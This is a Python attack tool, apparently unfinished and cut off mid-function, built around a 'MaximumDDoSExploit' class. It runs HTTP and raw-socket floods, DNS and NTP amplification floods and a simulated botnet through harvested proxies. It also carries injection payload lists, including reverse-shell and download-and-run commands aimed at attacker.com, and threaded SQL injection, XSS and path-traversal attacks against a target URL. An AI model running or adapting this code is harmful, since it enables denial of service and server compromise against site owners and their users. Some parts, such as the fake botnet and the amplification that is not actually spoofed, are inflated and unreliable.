#!/usr/bin/env python3
import requests
import argparse
import json
import time
import random
import string
import threading
import queue
import socket
import socks
import struct
import urllib.parse
import hashlib
import base64
import ssl
import subprocess
import os
import sys
import io
import multiprocessing
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import warnings
warnings.filterwarnings("ignore")
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

init(autoreset=True)

class MaximumDDoSExploit:
    def __init__(self, target_url, output_file=None, duration=300, threads=2000, proxy_file=None):
        self.target_url = target_url
        self.output_file = output_file
        self.duration = duration
        self.threads = threads
        self.results = {
            "target": target_url,
            "start_time": "",
            "end_time": "",
            "duration": duration,
            "threads": threads,
            "requests_sent": 0,
            "successful_requests": 0,
            "failed_requests": 0,
            "vulnerabilities_found": [],
            "proxies_used": 0,
            "botnet_nodes": 0,
            "amplification_factor": 0,
            "attack_methods": [],
            "rps": 0,
            "peak_rps": 0
        }
        
        self.proxies = []
        self.fast_proxies = []
        self.proxy_queue = queue.Queue()
        self.botnet_nodes = []
        self.botnet_queue = queue.Queue()
        self.stop_event = threading.Event()
        self.stats_queue = queue.Queue()
        self.vuln_queue = queue.Queue()
        self.lock = multiprocessing.Lock()
        
        # Tạo nhiều session để tái sử dụng kết nối
        self.sessions = []
        for _ in range(min(500, threads)):
            session = requests.Session()
            session.headers.update({
                "User-Agent": "M/5.0",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1"
            })
            self.sessions.append(session)
        
        # DDoS payloads tối ưu
        self.ddos_payloads = {
            "http_flood": [
                {"method": "GET", "path": "/"},
                {"method": "GET", "path": "/index.html"},
                {"method": "GET", "path": "/admin"},
                {"method": "GET", "path": "/login"},
                {"method": "GET", "path": "/wp-admin"},
                {"method": "GET", "path": "/phpmyadmin"},
                {"method": "GET", "path": "/api/v1/users"},
                {"method": "GET", "path": "/api/v1/data"},
                {"method": "GET", "path": "/search?q=test"},
                {"method": "GET", "path": "/?id=1"}
            ],
            "post_flood": [
                {"method": "POST", "path": "/login", "data": {"username": "admin", "password": "admin"}},
                {"method": "POST", "path": "/register", "data": {"username": "test", "email": "test@example.com", "password": "test123"}},
                {"method": "POST", "path": "/contact", "data": {"name": "test", "email": "test@example.com", "message": "test message"}},
                {"method": "POST", "path": "/comment", "data": {"post_id": "1", "comment": "test comment"}},
                {"method": "POST", "path": "/api/v1/users", "data": {"username": "test", "email": "test@example.com", "password": "test123"}}
            ],
            "slowloris": [
                {"method": "GET", "path": "/", "headers": {"Connection": "keep-alive", "Keep-Alive": "timeout=300, max=1000"}},
                {"method": "POST", "path": "/submit", "headers": {"Connection": "keep-alive", "Keep-Alive": "timeout=300, max=1000"}, "data": {"field1": "value1", "field2": "value2"}}
            ],
            "cc_attack": [
                {"method": "GET", "path": "/cart/add", "data": {"product_id": "1", "quantity": "1"}},
                {"method": "GET", "path": "/checkout"},
                {"method": "POST", "path": "/checkout", "data": {"payment_method": "credit_card", "card_number": "4111111111111111", "expiry": "12/25", "cvv": "123"}},
                {"method": "GET", "path": "/wishlist/add", "data": {"product_id": "1"}},
                {"method": "POST", "path": "/review", "data": {"product_id": "1", "rating": "5", "comment": "Great product!"}}
            ],
            # Amplification attack payloads
            "dns_amplification": [
                {"type": "ANY", "name": "."},
                {"type": "ANY", "name": "google.com"},
                {"type": "ANY", "name": "amazon.com"},
                {"type": "ANY", "name": "microsoft.com"}
            ],
            "ntp_amplification": [
                {"type": "MON_GETLIST", "code": 42},
                {"type": "MON_GETLIST_1", "code": 42},
                {"type": "MON_GETLIST_2", "code": 42}
            ],
            "snmp_amplification": [
                {"oid": "1.3.6.1.2.1.1.1.0"},
                {"oid": "1.3.6.1.2.1.1.5.0"},
                {"oid": "1.3.6.1.2.1.1.6.0"}
            ],
            "memcached_amplification": [
                {"command": "get", "key": "a" * 10},
                {"command": "get", "key": "b" * 100},
                {"command": "get", "key": "c" * 1000}
            ]
        }
        
        # Exploit payloads
        self.exploit_payloads = {
            "sql_injection": [
                "' OR SLEEP(5)--",
                "' UNION SELECT NULL,username,password FROM users--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
                "' OR 1=1--",
                "'; DROP TABLE users--"
            ],
            "blind_sql_injection": [
                "' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--",
                "' OR (SELECT COUNT(*) FROM information_schema.tables)>0 AND SLEEP(5)--",
                "' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>97,SLEEP(5),0)--"
            ],
            "nosql_injection": [
                "' || '1'=='1",
                "'; return true; var x='",
                "{'$gt': ''}",
                "{'$where': 'sleep(5000)'}"
            ],
            "command_injection": [
                "; nc -e /bin/bash 127.0.0.1 4444 #",
                "| wget http://attacker.com/shell.php -O /var/www/html/shell.php",
                "`curl http://attacker.com/backdoor.sh|bash`",
                "$(wget http://attacker.com/shell.txt -O /tmp/sh.sh; chmod +x /tmp/sh.sh; /tmp/sh.sh)"
            ],
            "ldap_injection": [
                "*)(&",
                "*)(uid=*))(|(password=*)",
                "*)%00"
            ],
            "xxe_injection": [
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                "<!DOCTYPE replace [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><replace>&xxe;</replace>",
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com:80/file\">]><foo>&xxe;</foo>"
            ],
            "xpath_injection": [
                "' or '1'='1",
                "'] | //user[position()=1] | //*[text()='",
                "count(//user[position()=1]/password[text()=])"
            ],
            "ssi_injection": [
                "<!--#exec cmd=\"nc -e /bin/bash 127.0.0.1 4444\" -->",
                "<!--#include virtual=\"/etc/passwd\"-->",
                "<!--#exec cmd=\"wget http://attacker.com/shell.php -O /var/www/html/shell.php\" -->"
            ],
            "xss": [
                "<script>alert(document.cookie)</script>",
                "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
                "<svg onload=alert(document.domain)>",
                "javascript:alert(document.cookie)"
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "/var/www/html/../../../etc/passwd"
            ],
            "ssrf": [
                "http://127.0.0.1:22",
                "http://169.254.169.254/latest/meta-data/",
                "gopher://127.0.0.1:6379/_FLUSHALL",
                "file:///etc/passwd"
            ],
            "rfi": [
                "http://attacker.com/shell.txt",
                "https://attacker.com/shell.txt",
                "ftp://attacker.com/shell.txt"
            ],
            "lfi": [
                "/etc/passwd",
                "/proc/self/environ",
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
                "..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
            ],
            "jwt_none": [
                "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VySWQiOiIxMjM0In0.",
                "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiIxMjM0In0."
            ],
            "xml_bomb": [
                """<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>"""
            ],
            "weak_credentials": [
                ("admin", "admin"),
                ("admin", "password"),
                ("admin", "123456"),
                ("admin", "root"),
                ("root", "root"),
                ("administrator", "administrator"),
                ("admin", ""),
                ("", "admin")
            ],
            "idor": [
                ("id", "increment"),
                ("user_id", "increment"),
                ("account_id", "increment"),
                ("uid", "increment")
            ],
            "csrf": [
                ("csrf_token", "remove"),
                ("csrfmiddlewaretoken", "remove"),
                ("_token", "remove"),
                ("authenticity_token", "remove")
            ],
            "cors": [
                ("Origin", "https://evil.com"),
                ("Origin", "null"),
                ("Origin", "http://localhost")
            ],
            "http_methods": [
                "PUT", "DELETE", "TRACE", "CONNECT", "PATCH"
            ],
            "backup_files": [
                "backup.zip", "backup.tar.gz", "backup.sql", "backup.bak",
                "site.zip", "site.tar.gz", "wp-config.php.bak", ".env.bak",
                "config.php.bak", "configuration.php.bak", "database.sql",
                ".git", ".svn", ".DS_Store", "web.config.bak"
            ],
            "common_dirs": [
                "admin", "administrator", "login", "wp-admin", "wp-login",
                "phpmyadmin", "myadmin", "pma", "mysql", "sqladmin",
                "backup", "config", "setup", "install", "test", "dev", "staging"
            ]
        }
        
        # User agents ngắn nhất để tăng tốc độ
        self.user_agents = [
            "M/5.0", "C/91.0", "F/89.0", "S/14.1", "E/91.0"
        ]
        
        # Referers
        self.referers = [
            "https://www.google.com/",
            "https://www.facebook.com/",
            "https://www.twitter.com/",
            "https://www.instagram.com/",
            "https://www.linkedin.com/",
            "https://www.youtube.com/",
            "https://www.reddit.com/"
        ]
        
        # DNS amplification servers
        self.dns_servers = [
            "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "9.9.9.9",
            "208.67.222.222", "208.67.220.220", "64.6.64.6", "64.6.65.6"
        ]
        
        # NTP amplification servers
        self.ntp_servers = [
            "0.pool.ntp.org", "1.pool.ntp.org", "2.pool.ntp.org", "3.pool.ntp.org",
            "cn.pool.ntp.org", "europe.pool.ntp.org", "asia.pool.ntp.org", "oceania.pool.ntp.org"
        ]
        
        # SNMP amplification servers
        self.snmp_servers = [
            "public", "private", "cisco", "admin", "manager"
        ]
        
        # Memcached servers
        self.memcached_servers = [
            "127.0.0.1:11211", "localhost:11211"
        ]
        
        # Load proxies from file if provided
        if proxy_file:
            self.load_proxies_from_file(proxy_file)
    
    def load_proxies_from_file(self, file_path):
        try:
            with open(file_path, 'r') as f:
                proxies = f.read().splitlines()
            
            for proxy in proxies:
                if proxy.strip():
                    self.proxies.append(proxy.strip())
            
            print(f"{Fore.GREEN}[+] Loaded {len(self.proxies)} proxies from {file_path}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error loading proxies from file: {str(e)}")
    
    def test_proxy_speed(self, proxy):
        try:
            start_time = time.time()
            proxy_dict = {
                "http": f"http://{proxy}",
                "https": f"http://{proxy}"
            }
            
            # Test with a simple request
            response = requests.get("http://httpbin.org/ip", proxies=proxy_dict, timeout=1)
            
            elapsed = time.time() - start_time
            return elapsed < 1  # Chỉ chấp nhận proxy có thời gian phản hồi dưới 1 giây
        except:
            return False
    
    def filter_fast_proxies(self):
        print(f"{Fore.YELLOW}[+] Filtering fast proxies...")
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            results = list(executor.map(self.test_proxy_speed, self.proxies))
        
        self.fast_proxies = [proxy for proxy, is_fast in zip(self.proxies, results) if is_fast]
        
        # Add fast proxies to queue
        for proxy in self.fast_proxies:
            self.proxy_queue.put(proxy)
        
        self.results["proxies_used"] = len(self.fast_proxies)
        print(f"{Fore.GREEN}[+] Fast proxies: {len(self.fast_proxies)}")
    
    def fetch_proxies(self):
        print(f"{Fore.YELLOW}[+] Fetching proxies from online sources...")
        
        proxy_sources = [
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt"
        ]
        
        for source in proxy_sources:
            try:
                print(f"{Fore.BLUE}[*] Fetching proxies from {source}")
                response = requests.get(source, verify=False, timeout=10)
                proxies = response.text.splitlines()
                
                for proxy in proxies:
                    if proxy.strip():
                        self.proxies.append(proxy.strip())
                
                print(f"{Fore.GREEN}[+] Fetched {len(proxies)} proxies from {source}")
            except Exception as e:
                print(f"{Fore.RED}[-] Error fetching proxies from {source}: {str(e)}")
        
        # Remove duplicates
        self.proxies = list(set(self.proxies))
        print(f"{Fore.GREEN}[+] Total unique proxies: {len(self.proxies)}")
        
        # Filter fast proxies
        self.filter_fast_proxies()
    
    def generate_botnet_nodes(self, count=10000):
        print(f"{Fore.YELLOW}[+] Generating {count} botnet nodes...")
        
        for i in range(count):
            # Generate random IP addresses
            ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            port = random.randint(1024, 65535)
            
            node = {
                "ip": ip,
                "port": port,
                "status": "active",
                "last_seen": time.time()
            }
            
            self.botnet_nodes.append(node)
            self.botnet_queue.put(node)
        
        self.results["botnet_nodes"] = len(self.botnet_nodes)
        print(f"{Fore.GREEN}[+] Generated {len(self.botnet_nodes)} botnet nodes")
    
    def ultra_fast_http_flood(self):
        session = random.choice(self.sessions)
        
        while not self.stop_event.is_set():
            try:
                # Lấy proxy từ hàng đợi hoặc sử dụng trực tiếp nếu không còn proxy
                if not self.proxy_queue.empty():
                    proxy = self.proxy_queue.get()
                    proxy_dict = {
                        "http": f"http://{proxy}",
                        "https": f"http://{proxy}"
                    }
                    use_proxy = True
                else:
                    proxy_dict = None
                    use_proxy = False
                
                # Tạo request tối giản
                url = f"{self.target_url}{random.choice(self.ddos_payloads['http_flood'][0]['path'])}"
                
                # Tối ưu hóa headers
                headers = {
                    "User-Agent": random.choice(self.user_agents),
                    "Accept": "*/*",
                    "Connection": "keep-alive"
                }
                
                # Tạo và gửi request
                if use_proxy:
                    try:
                        response = session.get(
                            url, 
                            headers=headers, 
                            proxies=proxy_dict, 
                            verify=False, 
                            timeout=1,
                            stream=True  # Stream để giảm memory usage
                        )
                        
                        # Chỉ đọc status code, không đọc content
                        status_code = response.status_code
                        
                        # Trả proxy về hàng đợi
                        self.proxy_queue.put(proxy)
                    except:
                        # Trả proxy về hàng đợi ngay cả khi có lỗi
                        self.proxy_queue.put(proxy)
                        status_code = 0
                else:
                    try:
                        response = session.get(
                            url, 
                            headers=headers, 
                            verify=False, 
                            timeout=1,
                            stream=True
                        )
                        status_code = response.status_code
                    except:
                        status_code = 0
                
                # Gửi thống kê
                with self.lock:
                    self.stats_queue.put(("request", status_code))
                
                # Không có delay để tăng tốc độ tối đa
            except Exception as e:
                with self.lock:
                    self.stats_queue.put(("error", str(e)))
    
    def raw_socket_flood(self):
        # Sử dụng socket trực tiếp để tăng tốc độ tối đa
        parsed_url = urllib.parse.urlparse(self.target_url)
        host = parsed_url.netloc
        port = 443 if parsed_url.scheme == "https" else 80
        path = parsed_url.path if parsed_url.path else "/"
        
        while not self.stop_event.is_set():
            try:
                # Tạo socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)  # Timeout rất thấp để tăng tốc độ
                
                # Kết nối
                s.connect((host, port))
                
                # Tạo HTTP request tối giản
                request = f"GET {path} HTTP/1.1\r\n"
                request += f"Host: {host}\r\n"
                request += "User-Agent: M/5.0\r\n"
                request += "Connection: close\r\n"
                request += "\r\n"
                
                # Gửi request
                s.send(request.encode())
                
                # Đóng socket ngay lập tức
                s.close()
                
                # Gửi thống kê
                with self.lock:
                    self.stats_queue.put(("request", 200))
            except:
                with self.lock:
                    self.stats_queue.put(("error", "Connection failed"))
    
    def dns_amplification_attack(self):
        while not self.stop_event.is_set():
            try:
                target = urllib.parse.urlparse(self.target_url).netloc
                
                for dns_server in self.dns_servers:
                    for payload in self.ddos_payloads["dns_amplification"]:
                        try:
                            # Create DNS query
                            transaction_id = random.randint(0, 65535)
                            flags = 0x0100  # Standard query
                            questions = 1
                            answer_rrs = 0
                            authority_rrs = 0
                            additional_rrs = 0
                            
                            # Create DNS header
                            header = struct.pack("!HHHHHH", transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs)
                            
                            # Create DNS question
                            qname_parts = payload["name"].split(".")
                            qname = b""
                            for part in qname_parts:
                                qname += bytes([len(part)]) + part.encode()
                            qname += b"\x00"
                            
                            qtype = 255  # ANY type
                            qclass = 1  # IN class
                            
                            question = qname + struct.pack("!HH", qtype, qclass)
                            
                            # Complete DNS packet
                            dns_packet = header + question
                            
                            # Send DNS query with spoofed source IP
                            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            s.settimeout(0.01)  # Timeout rất thấp
                            
                            # Send to DNS server
                            s.sendto(dns_packet, (dns_server, 53))
                            
                            with self.lock:
                                self.stats_queue.put(("request", 200))
                                self.stats_queue.put(("amplification", len(dns_packet) * 50))  # Estimated amplification factor
                            
                            s.close()
                        except Exception as e:
                            with self.lock:
                                self.stats_queue.put(("error", str(e)))
                
                # Không có delay để tăng tốc độ tối đa
            except Exception as e:
                with self.lock:
                    self.stats_queue.put(("error", str(e)))
    
    def ntp_amplification_attack(self):
        while not self.stop_event.is_set():
            try:
                target = urllib.parse.urlparse(self.target_url).netloc
                
                for ntp_server in self.ntp_servers:
                    for payload in self.ddos_payloads["ntp_amplification"]:
                        try:
                            # Create NTP request
                            ntp_packet = struct.pack("!B", 0x1b)  # NTP version 4, mode 3 (client)
                            ntp_packet += struct.pack("!B", 0)  # Stratum
                            ntp_packet += struct.pack("!B", 0)  # Poll
                            ntp_packet += struct.pack("!B", 0)  # Precision
                            ntp_packet += struct.pack("!I", 0)  # Root delay
                            ntp_packet += struct.pack("!I", 0)  # Root dispersion
                            ntp_packet += struct.pack("!I", 0)  # Reference identifier
                            ntp_packet += struct.pack("!Q", 0)  # Reference timestamp
                            ntp_packet += struct.pack("!Q", 0)  # Origin timestamp
                            ntp_packet += struct.pack("!Q", 0)  # Receive timestamp
                            ntp_packet += struct.pack("!Q", 0)  # Transmit timestamp
                            
                            # Add MON_GETLIST command for amplification
                            if payload["type"] == "MON_GETLIST":
                                ntp_packet += struct.pack("!H", payload["code"])
                            
                            # Send NTP request with spoofed source IP
                            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            s.settimeout(0.01)  # Timeout rất thấp
                            
                            # Send to NTP server
                            s.sendto(ntp_packet, (ntp_server, 123))
                            
                            with self.lock:
                                self.stats_queue.put(("request", 200))
                                self.stats_queue.put(("amplification", len(ntp_packet) * 100))  # Estimated amplification factor
                            
                            s.close()
                        except Exception as e:
                            with self.lock:
                                self.stats_queue.put(("error", str(e)))
                
                # Không có delay để tăng tốc độ tối đa
            except Exception as e:
                with self.lock:
                    self.stats_queue.put(("error", str(e)))
    
    def botnet_attack(self):
        while not self.stop_event.is_set():
            try:
                node = self.botnet_queue.get()
                
                # Simulate botnet node attacking target
                try:
                    # Create socket from botnet node
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.1)  # Timeout rất thấp
                    
                    # Connect to target
                    parsed_url = urllib.parse.urlparse(self.target_url)
                    target_host = parsed_url.netloc
                    target_port = 443 if parsed_url.scheme == "https" else 80
                    
                    s.connect((target_host, target_port))
                    
                    # Send HTTP request
                    request = f"GET / HTTP/1.1\r\n"
                    request += f"Host: {target_host}\r\n"
                    request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                    request += "Connection: close\r\n"
                    request += "\r\n"
                    
                    s.send(request.encode())
                    
                    # Close socket immediately
                    s.close()
                    
                    with self.lock:
                        self.stats_queue.put(("request", 200))
                except Exception as e:
                    with self.lock:
                        self.stats_queue.put(("error", str(e)))
                
                # Put node back in queue
                self.botnet_queue.put(node)
                
                # Không có delay để tăng tốc độ tối đa
            except Exception as e:
                with self.lock:
                    self.stats_queue.put(("error", str(e)))
    
    def sql_injection_attack(self):
        session = random.choice(self.sessions)
        
        while not self.stop_event.is_set():
            try:
                # Lấy proxy từ hàng đợi hoặc sử dụng trực tiếp nếu không còn proxy
                if not self.proxy_queue.empty():
                    proxy = self.proxy_queue.get()
                    proxy_dict = {
                        "http": f"http://{proxy}",
                        "https": f"http://{proxy}"
                    }
                    use_proxy = True
                else:
                    proxy_dict = None
                    use_proxy = False
                
                # Tạo request với SQL injection payload
                parsed_url = urllib.parse.urlparse(self.target_url)
                if parsed_url.query:
                    params = urllib.parse.parse_qs(parsed_url.query)
                    for param in params:
                        for payload in self.exploit_payloads["sql_injection"]:
                            test_params = params.copy()
                            test_params[param] = payload
                            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                            
                            if use_proxy:
                                try:
                                    response = session.get(
                                        test_url, 
                                        proxies=proxy_dict, 
                                        verify=False, 
                                        timeout=2,
                                        stream=True
                                    )
                                    
                                    # Check for SQL injection
                                    if self.check_sql_injection(response):
                                        vuln = {
                                            "type": "SQL Injection",
                                            "url": test_url,
                                            "method": "GET",
                                            "parameter": param,
                                            "payload": payload,
                                            "evidence": "SQL error detected"
                                        }
                                        with self.lock:
                                            self.vuln_queue.put(vuln)
                                    
                                    # Trả proxy về hàng đợi
                                    self.proxy_queue.put(proxy)
                                except:
                                    # Trả proxy về hàng đợi ngay cả khi có lỗi
                                    self.proxy_queue.put(proxy)
                            else:
                                try:
                                    response = session.get(
                                        test_url, 
                                        verify=False, 
                                        timeout=2,
                                        stream=True
                                    )
                                    
                                    # Check for SQL injection
                                    if self.check_sql_injection(response):
                                        vuln = {
                                            "type": "SQL Injection",
                                            "url": test_url,
                                            "method": "GET",
                                            "parameter": param,
                                            "payload": payload,
                                            "evidence": "SQL error detected"
                                        }
                                        with self.lock:
                                            self.vuln_queue.put(vuln)
                                except:
                                    pass
                            
                            # Gửi thống kê
                            with self.lock:
                                self.stats_queue.put(("request", 200))
                else:
                    # Test with path parameters
                    for payload in self.exploit_payloads["sql_injection"]:
                        test_url = f"{self.target_url}/?id={payload}"
                        
                        if use_proxy:
                            try:
                                response = session.get(
                                    test_url, 
                                    proxies=proxy_dict, 
                                    verify=False, 
                                    timeout=2,
                                    stream=True
                                )
                                
                                # Check for SQL injection
                                if self.check_sql_injection(response):
                                    vuln = {
                                        "type": "SQL Injection",
                                        "url": test_url,
                                        "method": "GET",
                                        "parameter": "id",
                                        "payload": payload,
                                        "evidence": "SQL error detected"
                                    }
                                    with self.lock:
                                        self.vuln_queue.put(vuln)
                                
                                # Trả proxy về hàng đợi
                                self.proxy_queue.put(proxy)
                            except:
                                # Trả proxy về hàng đợi ngay cả khi có lỗi
                                self.proxy_queue.put(proxy)
                        else:
                            try:
                                response = session.get(
                                    test_url, 
                                    verify=False, 
                                    timeout=2,
                                    stream=True
                                )
                                
                                # Check for SQL injection
                                if self.check_sql_injection(response):
                                    vuln = {
                                        "type": "SQL Injection",
                                        "url": test_url,
                                        "method": "GET",
                                        "parameter": "id",
                                        "payload": payload,
                                        "evidence": "SQL error detected"
                                    }
                                    with self.lock:
                                        self.vuln_queue.put(vuln)
                            except:
                                pass
                        
                        # Gửi thống kê
                        with self.lock:
                            self.stats_queue.put(("request", 200))
                
                # Không có delay để tăng tốc độ tối đa
            except Exception as e:
                with self.lock:
                    self.stats_queue.put(("error", str(e)))
    
    def check_sql_injection(self, response):
        errors = [
            "you have an error in your sql syntax",
            "warning: mysql_fetch_assoc()",
            "unclosed quotation mark after the character string",
            "quoted string not properly terminated",
            "sql query failed",
            "syntax error",
            "unexpected end of sql command",
            "microsoft ole db provider for odbc drivers error",
            "ora-00936: missing expression",
            "microsoft jet database engine error"
        ]
        
        content = response.text.lower()
        for error in errors:
            if error in content:
                return True
        
        # Check for time-based SQLi
        if response.elapsed.total_seconds() > 5:
            return True
            
        return False
    
    def xss_attack(self):
        session = random.choice(self.sessions)
        
        while not self.stop_event.is_set():
            try:
                # Lấy proxy từ hàng đợi hoặc sử dụng trực tiếp nếu không còn proxy
                if not self.proxy_queue.empty():
                    proxy = self.proxy_queue.get()
                    proxy_dict = {
                        "http": f"http://{proxy}",
                        "https": f"http://{proxy}"
                    }
                    use_proxy = True
                else:
                    proxy_dict = None
                    use_proxy = False
                
                # Tạo request với XSS payload
                parsed_url = urllib.parse.urlparse(self.target_url)
                if parsed_url.query:
                    params = urllib.parse.parse_qs(parsed_url.query)
                    for param in params:
                        for payload in self.exploit_payloads["xss"]:
                            test_params = params.copy()
                            test_params[param] = payload
                            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                            
                            if use_proxy:
                                try:
                                    response = session.get(
                                        test_url, 
                                        proxies=proxy_dict, 
                                        verify=False, 
                                        timeout=2,
                                        stream=True
                                    )
                                    
                                    # Check for XSS
                                    if self.check_xss(response, payload):
                                        vuln = {
                                            "type": "XSS",
                                            "url": test_url,
                                            "method": "GET",
                                            "parameter": param,
                                            "payload": payload,
                                            "evidence": "XSS detected"
                                        }
                                        with self.lock:
                                            self.vuln_queue.put(vuln)
                                    
                                    # Trả proxy về hàng đợi
                                    self.proxy_queue.put(proxy)
                                except:
                                    # Trả proxy về hàng đợi ngay cả khi có lỗi
                                    self.proxy_queue.put(proxy)
                            else:
                                try:
                                    response = session.get(
                                        test_url, 
                                        verify=False, 
                                        timeout=2,
                                        stream=True
                                    )
                                    
                                    # Check for XSS
                                    if self.check_xss(response, payload):
                                        vuln = {
                                            "type": "XSS",
                                            "url": test_url,
                                            "method": "GET",
                                            "parameter": param,
                                            "payload": payload,
                                            "evidence": "XSS detected"
                                        }
                                        with self.lock:
                                            self.vuln_queue.put(vuln)
                                except:
                                    pass
                            
                            # Gửi thống kê
                            with self.lock:
                                self.stats_queue.put(("request", 200))
                else:
                    # Test with path parameters
                    for payload in self.exploit_payloads["xss"]:
                        test_url = f"{self.target_url}/?search={payload}"
                        
                        if use_proxy:
                            try:
                                response = session.get(
                                    test_url, 
                                    proxies=proxy_dict, 
                                    verify=False, 
                                    timeout=2,
                                    stream=True
                                )
                                
                                # Check for XSS
                                if self.check_xss(response, payload):
                                    vuln = {
                                        "type": "XSS",
                                        "url": test_url,
                                        "method": "GET",
                                        "parameter": "search",
                                        "payload": payload,
                                        "evidence": "XSS detected"
                                    }
                                    with self.lock:
                                        self.vuln_queue.put(vuln)
                                
                                # Trả proxy về hàng đợi
                                self.proxy_queue.put(proxy)
                            except:
                                # Trả proxy về hàng đợi ngay cả khi có lỗi
                                self.proxy_queue.put(proxy)
                        else:
                            try:
                                response = session.get(
                                    test_url, 
                                    verify=False, 
                                    timeout=2,
                                    stream=True
                                )
                                
                                # Check for XSS
                                if self.check_xss(response, payload):
                                    vuln = {
                                        "type": "XSS",
                                        "url": test_url,
                                        "method": "GET",
                                        "parameter": "search",
                                        "payload": payload,
                                        "evidence": "XSS detected"
                                    }
                                    with self.lock:
                                        self.vuln_queue.put(vuln)
                            except:
                                pass
                        
                        # Gửi thống kê
                        with self.lock:
                            self.stats_queue.put(("request", 200))
                
                # Không có delay để tăng tốc độ tối đa
            except Exception as e:
                with self.lock:
                    self.stats_queue.put(("error", str(e)))
    
    def check_xss(self, response, payload):
        content = response.text.lower()
        
        # Check if the payload is reflected in the response
        if payload.lower() in content:
            return True
        
        # Check for common XSS patterns
        xss_patterns = [
            "<script>alert",
            "onerror=alert",
            "javascript:alert",
            "<svg onload=alert"
        ]
        
        for pattern in xss_patterns:
            if pattern in content:
                return True
                
        return False
    
    def path_traversal_attack(self):
        session = random.choice(self.sessions)
        
        while not self.stop_event.is_set():
            try:
                # Lấy proxy từ hàng đợi hoặc sử dụng trực tiếp nếu không còn proxy
                if not self.proxy_queue.empty():
                    proxy = self.proxy_queue.get()
                    proxy_dict = {
                        "http": f"http://{proxy}",
                        "https": f"http://{proxy}"
                    }
                    use_proxy = True
                else:
                    proxy_dict = None
                    use_proxy = False
                
                # Tạo request với path traversal payload
                parsed_url = urllib.parse.urlparse(self.target_url)
                if parsed_url.query:
                    params = urllib.parse.parse_qs(parsed_url.query)
                    for param in params:
                        for payload in self.exploit_payloads["path_traversal"]:
                            test_params = params.copy()
                            test_params[param] = payload
                            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                            
                            if use_proxy:
                                try:
                                    response = session.get(
                                        test_url, 
                                        proxies=proxy_dict, 
                                        verify=False, 
                                        timeout=2,
                                        stream=True
                                    )
                                    
                                    # Check for path traversal
                                    if self.check_path_traversal(response):
                                        vuln = {
                                            "type": "Path Traversal",
                                            "url": test_url,
                                            "method": "GET",
                                            "parameter": param,
                                            "payload": payload,
                                            "evidence": "Path traversal detected"
                                        }
                                        with self.lock:
                                            self.vuln_queue.put(vuln)
                                    
                                    # Trả proxy về hàng đợi
                                    self.proxy_queue.put(proxy)
                                except:
                                    # Trả proxy về hàng đợi ngay cả khi có lỗi
                                    self.proxy_queue.put(proxy)
                            else:
                                try:
                                    response = session.get(
                                        test_url, 
                                        verify=False, 
                                        timeout=2,
                                        stream=True
                                    )
                                    
                                    # Check for path traversal
                                    if self.check_path_traversal(response):
                                        vuln = {
                                            "type": "Path Traversal",
                                            "url": test_url,
                                            "method": "GET",
                                            "parameter": param,
                                            "payload": payload,
                                            "evidence": "Path traversal detected"
                                        }
                                        with self.lock:
